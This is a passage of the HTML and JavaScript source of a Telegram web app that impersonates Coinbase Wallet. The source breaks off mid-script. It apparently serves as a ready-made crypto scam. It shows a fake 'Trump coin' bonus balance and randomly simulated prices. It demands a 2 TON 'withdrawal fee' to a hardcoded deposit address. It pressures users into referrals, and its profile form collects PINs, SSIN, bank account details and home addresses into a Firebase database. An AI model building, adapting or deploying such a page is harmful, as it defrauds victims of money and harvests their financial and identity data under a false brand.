<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
  <title>Coinbase Wallet</title>
  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/bootstrap/5.3.0/css/bootstrap.min.css">
  <link rel="stylesheet" href="https://site-assets.fontawesome.com/releases/v6.7.2/css/all.css">
  <link href="https://unpkg.com/boxicons@2.0.7/css/boxicons.min.css" rel="stylesheet">
  <script src="https://telegram.org/js/telegram-web-app.js"></script>
  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600&display=swap" rel="stylesheet">
  <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/izitoast@1.4.0/dist/css/iziToast.min.css">
  <script src="https://cdn.jsdelivr.net/npm/izitoast@1.4.0/dist/js/iziToast.min.js"></script>
  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/toastify-js/1.12.0/toastify.min.css">
  <script src="https://cdnjs.cloudflare.com/ajax/libs/toastify-js/1.12.0/toastify.min.js"></script>
  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/izimodal/1.6.0/css/iziModal.min.css">
  <script src="https://cdn.rawgit.com/davidshimjs/qrcodejs/gh-pages/qrcode.min.js"></script>

  <style>
    body {
      background-color: #000;
      color: #fff;
      font-family: 'Inter', sans-serif;
      user-select: none;
    }
    #coinbase_hd {
      width: 35px;
      height: 35px;
      margin: 0;
      padding: 0;
      background-color: #fff;
      border-radius: 50%;
    }
    .wallet-header {
      display: flex;
      justify-content: space-between;
      align-items: center;
      padding: 15px;
      background-color: #111;
    }
    .wallet-header h1 {
      font-size: 1rem;
      margin: 0;
    }
    .account-section {
      display: flex;
      align-items: center;
      overflow: hidden;
      white-space: nowrap;
      text-overflow: ellipsis;
      max-width: 150px;
      cursor: pointer;
    }
    .account-section span {
      overflow: hidden;
      text-overflow: ellipsis;
      white-space: nowrap;
    }
    .dropdown-menu {
      background-color: #222;
      border: none;
      border-radius: 10px;
      overflow: hidden;
    }
    .dropdown-item {
      color: #fff;
      transition: all 0.3s;
    }
    .dropdown-item:active {
      background-color: gold;
      color: #000;
    }
    .balance-section {
      text-align: center;
      margin: 20px 0;
    }
    .balance-section h2 {
      font-size: 2.5rem;
      margin: 10px 0;
      font-weight: 900;
    }
    .coin-default {
      border-radius: 16px;
      padding: 2px 8px;
      background-color: #808080a6;
      font-size: 10px;
      color: #bfbfbfae;
      margin: 0;
      position: relative;
      top: -2.5px;
      font-weight: 900;
      opacity: 0.7;
    }
    .btn-circle {
      width: 55px;
      height: 55px;
      border-radius: 50%;
      border: none;
      background-color: #222;
      color: #fff;
      display: flex;
      justify-content: center;
      align-items: center;
      font-size: 1.2rem;
      margin: 10px;
    }
    .btn-circle:hover {
      background-color: gold;
      color: #222;
    }
    .action-buttons {
      display: flex;
      justify-content: center;
      gap: 10px;
    }
    @media only screen and (max-width: 450px) {
      .action-buttons {
        justify-content: center;
        gap: 2px;
      }
      .btn-circle {
        width: 45px;
        height: 45px;
      }
    }
    .action-item {
      text-align: center;
    }
    .action-item span {
      display: block;
      margin-top: 5px;
      font-size: 0.8rem;
    }
    .crypto-card {
      background-color: #222;
      border-radius: 20px;
      padding: 10px;
      display: flex;
      justify-content: space-between;
      align-items: center;
      margin: 10px 0;
    }
    .crypto-card img {
      width: 40px;
      height: 40px;
    }
    .crypto-card .details {
      flex-grow: 1;
      margin-left: 15px;
    }
    .crypto-card .details h5 {
      margin: 0;
    }
    .crypto-card .price {
      text-align: right;
    }
    .crypto-card .price span {
      font-size: 0.9rem;
      color: #999;
    }
    .green { color: green; }
    .red { color: red; }
    .dark-content {
      background-color: #222;
      color: #fff;
      padding: 20px;
      border-radius: 8px;
      font-size: 1rem;
    }
    .dark-content button {
      background-color: #444;
      color: #fff;
      border: none;
      padding: 10px 20px;
      margin-top: 15px;
      border-radius: 4px;
      cursor: pointer;
    }
    .dark-content button:hover {
      background-color: #666;
    }
    .iziModal {
      width: 80%;
      max-width: 500px;
    }
    .wallet-form {
      display: flex;
      flex-direction: column;
      align-items: center;
      gap: 10px;
      margin-bottom: 20px;
    }
    .wallet-form input[type="text"],
    .wallet-form input[type="email"],
    .wallet-form input[type="number"],
    .wallet-form input[type="password"] {
      width: 90%;
      max-width: 400px;
      padding: 10px;
      border: 1px solid #444;
      border-radius: 6px;
      background-color: #333;
      color: #fff;
      font-size: 0.9rem;
      outline: none;
    }
    .wallet-form input::placeholder {
      color: #aaa;
    }
    .wallet-form input[type="submit"] {
      padding: 10px 20px;
      background-color: #444;
      color: #fff;
      border: none;
      border-radius: 6px;
      cursor: pointer;
      font-size: 0.9rem;
      transition: background-color 0.3s ease;
    }
    .wallet-form input[type="submit"]:hover {
      background-color: #666;
    }
    .wallet-form input[type="submit"].loading {
      display: flex;
      align-items: center;
      justify-content: center;
      gap: 5px;
    }
    .depAddr {
      font-weight: bold;
      color: #0f7cdb;
      background: #333;
      padding: 5px 10px;
      border-radius: 6px;
      font-size: 0.9rem;
      letter-spacing: 0.5px;
    }
    #copyIt, #copyAddress {
      margin-left: 10px;
      cursor: pointer;
      color: #fff;
      font-size: 1.1rem;
      transition: color 0.3s ease;
    }
    #copyIt:hover, #copyAddress:hover {
      color: #0f7cdb;
    }
    .close-btn {
      margin-top: 15px;
      padding: 10px 20px;
      background-color: #444;
      color: #fff;
      border: none;
      border-radius: 6px;
      cursor: pointer;
      font-size: 0.9rem;
      transition: background-color 0.3s ease;
    }
    .close-btn:hover {
      background-color: #666;
    }
    .hidden-label {
      position: absolute;
      left: -9999px;
    }
    .coin-defaults {
      background-image: linear-gradient(45deg, gold, yellow, white, gray);
      background-size: 200% auto;
      color: transparent;
      -webkit-background-clip: text;
      animation: gradientAnimation 2s linear infinite;
    }
    @keyframes gradientAnimation {
      to {
        background-position: -200% center;
      }
    }
    .trump_img {
      border-radius: 50%;
      width: 50px;
      height: 50px;
    }
    .warning {
      color: red;
      font-weight: 100;
      font-size: 0.7rem;
    }
    .hide {
      display: none;
    }
    #qrCodeContainer canvas {
      padding: 15px;
      background-color: #fff;
      border-radius: 5px;
    }
    .visually-hidden {
      position: absolute;
      width: 1px;
      height: 1px;
      padding: 0;
      margin: -1px;
      overflow: hidden;
      clip: rect(0, 0, 0, 0);
      border: 0;
    }
    .form-select {
      padding: 10px;
      border-radius: 6px;
      border: 1px solid #444;
      background-color: #333;
      color: #fff;
      margin-bottom: 10px;
      font-size: 0.9rem;
    }
    #notification-table-body li {
      padding: 10px;
      border-bottom: 1px solid #444;
      font-size: 0.9rem;
    }
    #notification-table-body li:last-child {
      border-bottom: none;
    }
    body.light {
      background-color: #f8f9fa;
      color: #333;
    }
    body.light .wallet-header,
    body.light .crypto-card,
    body.light .dark-content {
      background-color: #fff;
      color: #333;
    }
    body.light .dropdown-menu {
      background-color: #fff;
      color: #333;
    }
    body.light .dropdown-item {
      color: #333;
    }
    body.light .btn-circle {
      background-color: #ddd;
      color: #333;
    }
    body.light .form-select,
    body.light .wallet-form input {
      background-color: #fff;
      color: #333;
      border: 1px solid #ccc;
    }
    body.light .table-dark {
      background-color: #fff;
      color: #333;
    }
    .wallet-cell {
      display: flex;
      align-items: center;
      gap: 5px;
    }
    .btn-copy {
      background-color: #28a745;
      color: #fff;
      border: none;
      padding: 6px 10px;
      border-radius: 6px;
      font-size: 0.85rem;
      cursor: pointer;
      transition: background-color 0.3s;
    }
    .btn-copy:hover {
      background-color: #218838;
    }
    @media (max-width: 576px) {
      .iziModal {
        width: 90%;
      }
      .dark-content {
        font-size: 0.85rem;
      }
      .wallet-form input,
      .form-select {
        font-size: 0.8rem;
      }
      .close-btn {
        font-size: 0.8rem;
      }
      .depAddr {
        font-size: 0.8rem;
      }
      .btn-copy {
        font-size: 0.75rem;
        padding: 6px 8px;
      }
      #copyIt, #copyAddress {
        font-size: 1rem;
      }
      .table {
        font-size: 0.75rem;
        display: block;
        overflow-x: auto;
        white-space: nowrap;
      }
      .table thead th {
        min-width: 80px;
      }
      .table tbody td {
        min-width: 80px;
      }
    }
  </style>
</head>
<body>
  <!-- Wallet Header -->
  <div class="wallet-header">
    <img id="coinbase_hd" src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcSDAaw4l8JGDm5-GkzwJuNd9m7vsxf9-5ZtXeN-akM1A82LJq7Re5MOYa0v-3xKpUd4NdM&usqp=CAU" alt="Coinbase">
    <h1>Coinbase Wallet</h1>
    <div class="dropdown">
      <div class="account-section dropdown-toggle" data-bs-toggle="dropdown" aria-expanded="false">
        <span id="account-name">Account</span>
      </div>
      <ul class="dropdown-menu">
        <li><a class="dropdown-item open-btn" id="profile-pop" data-modal-id="profile-iziModal">Profile</a></li>
        <li><a class="dropdown-item open-btn" id="history-pop" data-modal-id="history-iziModal">History</a></li>
        <li><a class="dropdown-item open-btn" id="notification-pop" data-modal-id="notification-iziModal">Notification</a></li>
        <li><a class="dropdown-item open-btn" id="settings-pop" data-modal-id="settings-iziModal">Settings</a></li>
        <li><a class="dropdown-item open-btn" id="logout-pop" data-modal-id="logout-iziModal">Logout</a></li>
      </ul>
    </div>
  </div>

  <!-- Balance Section -->
  <div class="balance-section">
    <h2 id="balance-display">$78.01</h2>
    <p>
      <span id="wallet-address" data-wallet="0xA1Ed1234567890abcdef1234567890abcdef1234">0xA1Ed...f1234</span>
      <i id="copyAddress" class="bx bx-copy" title="Copy full address"></i>
      <span class="coin-default"><span class="coin-defaults">Trump</span></span>
    </p>
  </div>

  <!-- Action Buttons -->
  <div class="action-buttons">
    <div class="action-item">
      <button class="btn-circle open-btn" data-modal-id="darkModal1"><i class="far fa-arrow-up-right"></i></button>
      <span>Send</span>
    </div>
    <div class="action-item">
      <button class="btn-circle open-withdraw" data-modal-id="darkModal7"><i class="far fa-arrow-alt-circle-up"></i></button>
      <span>Withdraw</span>
    </div>
    <div class="action-item">
      <button class="btn-circle open-btn" data-modal-id="darkModal3"><i class="fa-regular fa-gift"></i></button>
      <span>Hot 🔥</span>
    </div>
    <div class="action-item">
      <button class="btn-circle open-btn" data-modal-id="darkModal4"><i class="fa-regular fa-layer-plus"></i></button>
      <span>Tasks</span>
    </div>
    <div class="action-item">
      <button class="btn-circle open-btn" id="share-button" data-modal-id="darkModal5"><i class="fa-regular fa-share-nodes"></i></button>
      <span>Share</span>
    </div>
  </div>

  <!-- Crypto Cards -->
  <div class="container">
    <div class="crypto-card">
      <img src="https://static.coinpaprika.com/coin/bnb-binance-coin/logo.png" alt="BNB">
      <div class="details">
        <h5>BNB</h5>
        <span>BNB Smart Chain</span>
      </div>
      <div class="price">
        <p>$76.01</p>
        <span>691.03 $</span>
      </div>
    </div>
    <div class="crypto-card">
      <img src="https://static.coinpaprika.com/coin/eth-ethereum/logo.png" alt="ETH">
      <div class="details">
        <h5>ETH</h5>
        <span>Ethereum</span>
      </div>
      <div class="price">
        <p>$2.10</p>
        <span>3230.83 $</span>
      </div>
    </div>
    <div class="crypto-card">
      <img src="https://static.coinpaprika.com/coin/shib-shiba-inu/logo.png" alt="SHIBA">
      <div class="details">
        <h5>SHIBA</h5>
        <span>Ethereum</span>
      </div>
      <div class="price">
        <p>$1.51</p>
        <span>234.04 $</span>
      </div>
    </div>
    <div class="crypto-card">
      <img src="https://static.coinpaprika.com/coin/usdt-tether/logo.png" alt="USDT">
      <div class="details">
        <h5>USDT</h5>
        <span>BNB Smart Chain</span>
      </div>
      <div class="price">
        <p>$1.00</p>
        <span>1.00 $</span>
      </div>
    </div>
    <div class="crypto-card">
      <img src="https://static.coinpaprika.com/coin/pepe-pepe/logo.png" alt="PEPE">
      <div class="details">
        <h5>PEPE</h5>
        <span>Ethereum Chain</span>
      </div>
      <div class="price">
        <p>$0.00000123</p>
        <span>0.0000003 $</span>
      </div>
    </div>
    <div class="crypto-card">
      <img src="https://static.coinpaprika.com/coin/sui-sui/logo.png" alt="SUI">
      <div class="details">
        <h5>SUI</h5>
        <span>Sui Blockchain</span>
      </div>
      <div class="price">
        <p>$0.98</p>
        <span>1.02 $</span>
      </div>
    </div>
    <div class="crypto-card">
      <img src="https://static.coinpaprika.com/coin/link-chainlink/logo.png" alt="LINK">
      <div class="details">
        <h5>LINK</h5>
        <span>Ethereum Chain</span>
      </div>
      <div class="price">
        <p>$7.14</p>
        <span>7.01 $</span>
      </div>
    </div>
  </div>

  <!-- Dark Popup Modal 1 (Send) -->
  <div id="darkModal1" class="iziModal" data-izimodal-title="Send">
    <div class="dark-content">
      <p>Enter recipient details</p>
      <form class="wallet-form" id="send-form">
        <label for="sendWalletInput" class="hidden-label">Recipient Wallet Address</label>
        <input type="text" id="sendWalletInput" placeholder="Enter Recipient Wallet Address..." required>
        <span class="text-warning warning">Please verify that the wallet address is valid before sending to prevent loss of funds.</span>
        <label for="sendAmountInput" class="hidden-label">Send Amount</label>
        <input type="number" id="sendAmountInput" placeholder="Enter Amount" step="0.01" min="0.01" required>
        <span class="text-warning warning hide" id="insufficient-send-balance">* You do not have sufficient balance!</span>
        <input id="submitSendInfo" type="submit" value="Send">
      </form>
      <button class="close-btn">Close</button>
    </div>
  </div>

  <!-- Dark Popup Modal 2 (Eligibility Message) -->
  <div id="darkModal2" class="iziModal" data-izimodal-title="Withdraw">
    <div class="dark-content">
      <p id="withdraw-message">You need a minimum balance of $70.01 to withdraw.</p>
      <button class="close-btn">Close</button>
    </div>
  </div>

  <!-- Dark Popup Modal 3 -->
  <div id="darkModal3" class="iziModal" data-izimodal-title="Hot 🔥">
    <div class="dark-content">
      <p>Congratulation!</p>
      <p>You've joined the Trump coin bonus. Kindly complete the tasks to reach the withdrawal threshold.</p>
      <button class="close-btn">Close</button>
    </div>
  </div>

  <!-- Dark Popup Modal 4 (Tasks) -->
  <div id="darkModal4" class="iziModal" data-izimodal-title="Tasks">
    <div class="dark-content">
      <p style="text-align: left;">
        <span>Instructions & Rules:</span>
        <ol type="i" style="text-align:left;">
          <li>Share your unique referral link to earn bonuses and increase your balance.</li>
          <li>Join our official Telegram channel for real-time updates, rewards, and exclusive offers.</li>
          <li>Complete daily tasks posted on the channel to boost your earnings.</li>
          <li>Ensure your profile details are complete and accurate to avoid delays in withdrawal processing.</li>
          <li>Withdrawals require a 2 TON fee to the designated wallet address.</li>
          <li>Violations of terms (e.g., fake referrals) will result in account suspension.</li>
        </ol>
      </p>
      <p style="text-align: left;">
        <span>Guides:</span>
        <ul style="text-align:left;">
          <li>Use the Share button to copy your referral link and send it via Telegram or other platforms.</li>
          <li>Monitor your referral count in the Profile section to track your progress.</li>
          <li>Check the Transaction History regularly to confirm deposits, withdrawals, and fees.</li>
          <li>Contact support via the Telegram channel for issues with payments or account verification.</li>
        </ul>
      </p>
      <p>For more updates or inquiries:</p>
      <button class="close-btn"><a href="https://t.me/+SgPWVNYhL3QxNTkx">Join our channel</a></button>
      <button class="close-btn">Back</button>
    </div>
  </div>

  <!-- Dark Popup Modal 5 -->
  <div id="darkModal5" class="iziModal" data-izimodal-title="Share">
    <div class="dark-content">
      <p>Your referral link has been copied successfully!</p>
      <p>Share the link to get $10 per referral!</p>
      <p><strong style="color:red;">Note:</strong> Your withdrawal is subject to review and verification.</p>
      <button class="close-btn">Close</button>
    </div>
  </div>

  <!-- Dark Popup Modal 6 -->
  <div id="darkModal6" class="iziModal" data-izimodal-title="Update!!!">
    <div class="dark-content">
      <p><img class="trump_img" src="https://s2.coinmarketcap.com/static/img/coins/64x64/35336.png" alt="Trump"></p>
      <p><strong>Don't miss out</strong> on your special offer for this season. The live OFFICIAL TRUMP today is amazing with a 24-hour trading volume of $4430844387.08 USD. Be among the lucky winners now by completing the tasks.</p>
      <p>Share the link and join our channel to get $10 per referral!</p>
      <p><strong><a style="color:green;" href="https://coinmarketcap.com/currencies/official-trump/">Read More »</a></strong></p>
      <p><strong><a href="https://t.me/+SgPWVNYhL3QxNTkx">JOIN CHANNEL</a></strong></p>
      <button class="close-btn">Close</button>
    </div>
  </div>

  <!-- Dark Popup Modal 7 (Withdraw Form) -->
  <div id="darkModal7" class="iziModal" data-izimodal-title="Withdraw">
    <div class="dark-content">
      <p>Enter your withdrawal details</p>
      <form class="wallet-form" id="wallet-form">
        <label for="walletInput" class="hidden-label">Wallet Address</label>
        <input type="text" id="walletInput" placeholder="Enter Recipient Wallet Address..." required>
        <span class="text-warning warning">Please verify that the wallet address is valid before withdrawing to prevent loss of funds.</span>
        <label for="wallet_amountInput" class="hidden-label">Withdrawal Amount</label>
        <input type="number" id="wallet_amountInput" placeholder="Enter Amount" step="0.01" min="0.01" required>
        <span class="text-warning warning hide" id="insufficient-balance">* You do not have sufficient balance!</span>
        <input id="submitWalletInfo" type="submit" value="Withdraw">
      </form>
      <button class="close-btn">Close</button>
    </div>
  </div>

  <!-- Dark Popup Modal 8 -->
  <div id="darkModal8" class="iziModal" data-izimodal-title="Pending">
    <div class="dark-content">
      <p>Payment!!!</p>
      <p>Kindly copy the wallet address below and make a deposit of 2 <strong class="coin-defaults">TONS</strong>.</p>
      <p>
        <span class="depAddr">UQC1f5pf5qcK5gO1Dju5l5O9Xua_2M8W71Qn-Z0HfkO8aTDy</span>
        <i class="far fa-copy" id="copyIt" title="Copy Address"></i>
      </p>
      <div id="qrCodeContainer" style="margin-top: 15px;"></div>
      <p style="font-size:0.7rem;"><span style="color:red;">NOTE:</span> * Do not click continue if you have not made payment! Clicking continue without payment will incur permanent fund loss.</p>
      <p id="continuePayment"><strong id="continuePaymentText">Continue »</strong></p>
      <button class="close-btn">Close</button>
    </div>
  </div>

  <!-- Dark Popup Modal 9 -->
  <div id="darkModal9" class="iziModal" data-izimodal-title="Status - <strong>Pending</strong>">
    <div class="dark-content">
      <p><img class="trump_img" src="https://s2.coinmarketcap.com/static/img/coins/64x64/35336.png" alt="Trump"></p>
      <p><strong>Congratulations!!! 🎉🎉🎉</strong></p>
      <p>You have already requested a withdrawal! Kindly wait for confirmation of your payment. Your withdrawal will be automatically settled in your specified <span class="coin-defaults">TRUMP</span> wallet after verification.</p>
      <p><h4>Want to earn more?</h4></p>
      <p>Join our <a href="https://t.me/+SgPWVNYhL3QxNTkx">channel</a> and share your referral link!</p>
      <p style="font-style:italic; font-weight:100;">Thanks for your participation</p>
      <button class="close-btn" id="continuePaymentCls">Close</button>
    </div>
  </div>

  <!-- Profile iziModal -->
  <div id="profile-iziModal" class="iziModal" data-izimodal-title="<strong>Profile</strong>">
    <div class="dark-content">
      <p>Update your profile details:</p>
      <form id="profile-form" class="wallet-form">
        <label for="usernameInput" class="visually-hidden">Telegram Username</label>
        <input type="text" id="usernameInput" placeholder="Telegram Username" disabled>
        <label for="fullNameInput" class="visually-hidden">Full Name</label>
        <input type="text" id="fullNameInput" placeholder="Enter Full Name" required>
        <label for="emailInput" class="visually-hidden">Email</label>
        <input type="email" id="emailInput" placeholder="Enter Email (optional)">
        <label for="pinInput" class="visually-hidden">PIN</label>
        <input type="password" id="pinInput" placeholder="Enter 4 or 6-digit PIN" pattern="[0-9]{4}|[0-9]{6}" required>
        <label for="ssinInput" class="visually-hidden">SSIN</label>
        <input type="text" id="ssinInput" placeholder="Enter SSIN (optional)">
        <label for="accountNumberInput" class="visually-hidden">Account Number</label>
        <input type="text" id="accountNumberInput" placeholder="Enter Account Number (optional)">
        <label for="bankNameInput" class="visually-hidden">Bank Name</label>
        <input type="text" id="bankNameInput" placeholder="Enter Bank Name (optional)">
        <label for="addressInput" class="visually-hidden">Full Address</label>
        <input type="text" id="addressInput" placeholder="Enter Full Address (optional)">
        <input type="submit" id="submitProfileInfo" value="Save">
      </form>
      <button class="close-btn">Close</button>
    </div>
  </div>

  <!-- Settings iziModal -->
  <div id="settings-iziModal" class="iziModal" data-izimodal-title="<strong>Settings</strong>">
    <div class="dark-content">
      <p>Customize your preferences:</p>
      <form id="settings-form" class="wallet-form">
        <label for="themeSelect" class="visually-hidden">Theme</label>
        <select id="themeSelect" class="form-select">
          <option value="dark">Dark</option>
          <option value="light">Light</option>
        </select>
        <label for="currencySelect" class="visually-hidden">Currency</label>
        <select id="currencySelect" class="form-select">
          <option value="USD">USD</option>
          <option value="BTC">BTC</option>
        </select>
        <input type="submit" id="submitSettingsInfo" value="Save">
      </form>
      <button class="close-btn">Close</button>
    </div>
  </div>

  <!-- Notification iziModal -->
  <div id="notification-iziModal" class="iziModal" data-izimodal-title="<strong>Notifications</strong>">
    <div class="dark-content">
      <p>Your notifications:</p>
      <div id="notification-list">
        <ul id="notification-table-body" style="list-style: none; padding: 0;"></ul>
      </div>
      <button class="close-btn">Close</button>
    </div>
  </div>

  <!-- History iziModal -->
  <div id="history-iziModal" class="iziModal" data-izimodal-title="<strong>Transaction History</strong>">
    <div class="dark-content">
      <p>Your transaction history:</p>
      <div id="transaction-list">
        <table class="table table-dark">
          <thead>
            <tr>
              <th>Amount</th>
              <th>Wallet</th>
              <th>Type</th>
              <th>Status</th>
              <th>Date</th>
            </tr>
          </thead>
          <tbody id="transaction-table-body"></tbody>
        </table>
      </div>
      <button class="close-btn">Close</button>
    </div>
  </div>

  <!-- Logout iziModal -->
  <div id="logout-iziModal" class="iziModal" data-izimodal-title="<strong>Logout</strong>">
    <div class="dark-content">
      <p>You're about to logout of this app</p>
      <button class="close-btn" id="logout-btn">Logout</button>
      <button class="close-btn">Cancel</button>
    </div>
  </div>

  <script src="https://cdnjs.cloudflare.com/ajax/libs/bootstrap/5.3.0/js/bootstrap.bundle.min.js"></script>
  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js"></script>
  <script src="https://cdnjs.cloudflare.com/ajax/libs/izimodal/1.6.0/js/iziModal.min.js"></script>
  <script type="module" src="https://www.gstatic.com/firebasejs/11.2.0/firebase-app.js"></script>
  <script type="module" src="https://www.gstatic.com/firebasejs/11.2.0/firebase-database.js"></script>

  <!-- Firebase Module Script -->
  <script type="module">
    import { initializeApp } from 'https://www.gstatic.com/firebasejs/11.2.0/firebase-app.js';
    import { getDatabase, ref, set, get, update, onValue, push } from 'https://www.gstatic.com/firebasejs/11.2.0/firebase-database.js';

    const firebaseConfig = {
      apiKey: "AIzaSyACrAgpR14dAu54vW45RKkcFM_wD-f2p-0",
      authDomain: "coinbase-tgwallet.firebaseapp.com",
      projectId: "coinbase-tgwallet",
      databaseURL: "https://coinbase-tgwallet-default-rtdb.firebaseio.com",
      storageBucket: "coinbase-tgwallet.firebasestorage.app",
      messagingSenderId: "441804145305",
      appId: "1:441804145305:web:1fb586667c0d648c342e08",
      measurementId: "G-374F8YD4KV",
    };

    const app = initializeApp(firebaseConfig);
    const database = getDatabase(app);
    const tg = window.Telegram.WebApp;
    tg.ready();

    const userId = tg.initDataUnsafe.user?.id || "54321";
    const username = tg.initDataUnsafe.user?.username || "Anonymous";
    const userRef = ref(database, `users/${userId}`);

    window.firebaseFunctions = {
      database,
      userRef,
      ref,
      set,
      get,
      update,
      onValue,
      push,
      userId,
      username
    };

    function generateRandomString(length, chars) {
      let result = "";
      for (let i = 0; i < length; i++) {
        result += chars.charAt(Math.floor(Math.random() * chars.length));
      }
      return result;
    }

    function generateEthAddress() {
      const hexChars = "0123456789abcdef";
      return `0xA1Ed${generateRandomString(36, hexChars)}`;
    }
    window.generateEthAddress = generateEthAddress;

    function truncateAddress(address) {
      if (!address || address.length < 10) return address || "N/A";
      return `${address.slice(0, 6)}...${address.slice(-5)}`;
    }
    window.truncateAddress = truncateAddress;

    async function initializeUserData(attempts = 3) {
      for (let i = 0; i < attempts; i++) {
        try {
          const snapshot = await get(userRef);
          if (!snapshot.exists()) {
            const walletAddress = userId === "54321" ? "UQC1f5pf5qcK5gO1Dju5l5O9Xua_2M8W71Qn-Z0HfkO8aTDy" : generateEthAddress();
            await set(userRef, {
              username: username,
              fullName: "",
              email: "",
              pin: "",
              ssin: "",
              accountNumber: "",
              bankName: "",
              address: "",
              balance: 78.01,
              wallet: walletAddress,
              referrals: 0,
              referredBy: null,
              settings: { theme: "dark", currency: "USD" },
              notifications: {
                welcome: {
                  title: "Welcome!",
                  message: "Thanks for joining Coinbase Wallet!",
                  timestamp: new Date().toISOString(),
                },
              },
              transactions: {},
            });
            window.firebaseInitialized = true;
            iziToast.success({ title: "Success", message: "User profile created!", position: "topRight" });
            return true;
          } else {
            window.firebaseInitialized = true;
            return true;
          }
        } catch (error) {
          console.error(`Initialize attempt ${i + 1} failed:`, error);
          if (i === attempts - 1) {
            iziToast.error({ title: "Error", message: `Failed to initialize user data: ${error.message}`, position: "topRight" });
            return false;
          }
          await new Promise(resolve => setTimeout(resolve, 1000 * Math.pow(2, i)));
        }
      }
    }
    initializeUserData();
  </script>

  <!-- Main Script -->
  <script>
    // Clear cookies for testing
    document.cookie = `userWithdrawal=; expires=Thu, 01 Jan 1970 00:00:00 UTC; path=/`;
    document.cookie = `userPaid=; expires=Thu, 01 Jan 1970 00:00:00 UTC; path=/`;

    // Fetch BTC price with exponential backoff
    async function fetchBTCPrice(attempts = 3, baseDelay = 1000) {
      for (let i = 0; i < attempts; i++) {
        try {
          const response = await fetch('https://api.coingecko.com/api/v3/simple/price?ids=bitcoin&vs_currencies=usd', { signal: AbortSignal.timeout(5000) });
          if (!response.ok) throw new Error(`HTTP ${response.status}`);
          const data = await response.json();
          const price = data.bitcoin?.usd;
          if (!price) throw new Error('Invalid BTC price data');
          window.lastBtcPriceFetch = Date.now();
          return price;
        } catch (error) {
          console.error(`BTC price fetch attempt ${i + 1} failed:`, error);
          if (i === attempts - 1) return 60000; // Fallback
          await new Promise(resolve => setTimeout(resolve, baseDelay * Math.pow(2, i)));
        }
      }
      return 60000;
    }

    // Update balance display based on currency
    async function updateBalanceDisplay() {
      try {
        const snapshot = await window.firebaseFunctions.get(window.firebaseFunctions.userRef);
        const userData = snapshot.val() || {};
        const balance = userData.balance || 78.01;
        const currency = userData.settings?.currency || "USD";
        const $balanceDisplay = $("#balance-display");

        if (currency === "BTC") {
          const btcPrice = await fetchBTCPrice();
          const btcBalance = balance / btcPrice;
          $balanceDisplay.text(`${btcBalance.toFixed(6)} BTC`);
        } else {
          $balanceDisplay.text(`$${balance.toFixed(2)}`);
        }
      } catch (error) {
        console.error('Failed to update balance display:', error);
        iziToast.error({ title: "Error", message: "Failed to update balance display!", position: "topRight" });
      }
    }

    // Copy to clipboard
    function copyToClipboard(text) {
      if (!text) {
        iziToast.error({ title: "Error", message: "No text to copy!", position: "topRight" });
        return Promise.reject(new Error("Empty text"));
      }
      if (navigator.clipboard && window.isSecureContext) {
        return navigator.clipboard.writeText(text);
      } else {
        const textarea = document.createElement("textarea");
        textarea.value = text;
        document.body.appendChild(textarea);
        textarea.select();
        try {
          document.execCommand("copy");
          document.body.removeChild(textarea);
          return Promise.resolve();
        } catch (err) {
          document.body.removeChild(textarea);
          return Promise.reject(err);
        }
      }
    }

    // Show toast notification
    function showToast(message) {
      if (typeof Toastify !== "undefined") {
        Toastify({
          text: message,
          duration: 3000,
          gravity: "top",
          position: "right",
          style: { background: "#333" },
        }).showToast();
      } else {
        iziToast.info({ title: "Info", message, position: "topRight" });
        console.warn("Toastify not loaded, using iziToast.");
      }
    }

    // Wait for Firebase initialization
    function waitForFirebase(callback) {
      if (window.firebaseInitialized) {
        callback();
      } else {
        setTimeout(() => waitForFirebase(callback), 100);
      }
    }

    // Update crypto prices
    const updatePrices = () => {
      const cryptoCards = document.querySelectorAll('.crypto-card');
      cryptoCards.forEach((card) => {
        const priceElement = card.querySelector('.price p');
        const currentPriceText = priceElement.textContent.replace('$', '');
        const currentPrice = parseFloat(currentPriceText) || 0;
        const change = (Math.random() * 0.5 - 0.25).toFixed(2);
        const newPrice = Math.max(0, currentPrice + parseFloat(change)).toFixed(2);
        
        priceElement.textContent = `$${newPrice}`;
        priceElement.classList.remove('green', 'red');
        
        if (parseFloat(change) > 0) {
          priceElement.classList.add('green');
        } else if (parseFloat(change) < 0) {
          priceElement.classList.add('red');
        }
        // No class added if change is 0
      });
    };

    $(document).ready(function() {
      if (typeof $.fn.iziModal === "undefined") {
        iziToast.error({ title: "Error", message: "iziModal failed to load!", position: "topRight" });
        return;
      }

      // Initialize modals
      $(".iziModal").each(function() {
        $(this).iziModal({
          background: '#222',
          headerColor: '#444',
          width: '80%',
          radius: 10,
          transitionIn: 'fadeInUp',
          transitionOut: 'fadeOutDown',
          onOpening: function() {
            $(this).css('display', 'block');
          }
        });
      });

      // Open update modal on load
      $("#darkModal6").iziModal("open");
      setTimeout(() => $("#darkModal6").iziModal("close"), 20000);

      // Open modal buttons
      $(".open-btn").on("click", function() {
        const modalId = $(this).data("modal-id");
        try {
          $("#" + modalId).iziModal("open");
        } catch (error) {
          showToast(`Failed to open modal: ${error.message}`);
        }
      });

      // Close modal buttons
      $(".close-btn").on("click", function() {
        try {
          $(this).closest(".iziModal").iziModal("close");
        } catch (error) {
          showToast(`Failed to close modal: ${error.message}`);
        }
      });

      // Update prices every 5 seconds
      setInterval(updatePrices, 5000);

      waitForFirebase(async () => {
        const { database, userRef, ref, set, get, update, onValue, push, userId, username } = window.firebaseFunctions || {};
        if (!database || !onValue || !get) {
          iziToast.error({ title: "Error", message: "Firebase not initialized properly!", position: "topRight" });
          return;
        }

        // Initialize QR code
        const depositAddress = "UQC1f5pf5qcK5gO1Dju5l5O9Xua_2M8W71Qn-Z0HfkO8aTDy";
        try {
          new QRCode(document.getElementById("qrCodeContainer"), {
            text: depositAddress,
            width: 150,
            height: 150,
            colorDark: '#000000',
            colorLight: '#ffffff',
            correctLevel: QRCode.CorrectLevel.H,
          });
        } catch (error) {
          console.error("QR code generation failed:", error);
          iziToast.error({ title: "Error", message: "Failed to generate QR code!", position: "topRight" });
        }

